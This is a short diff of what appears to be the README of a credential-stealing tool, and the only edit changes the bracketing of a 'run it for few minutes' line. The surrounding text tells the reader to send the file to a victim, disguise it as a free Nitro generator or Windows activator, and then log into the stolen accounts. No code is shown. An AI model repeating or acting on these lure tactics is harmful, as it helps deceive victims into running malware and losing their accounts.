@@ -25,7 +25,7 @@ How to run it?
 - Just send the file to victim and make them run it
 - or say its free nitro generator, or free windows activator ;D
 
-[[[[Make sure to run it for few minutes!!!]]]]
+[Make sure to run it for few minutes!!!]
 -----------------------------------------------------
 Wanna log in to one of that accounts?
 
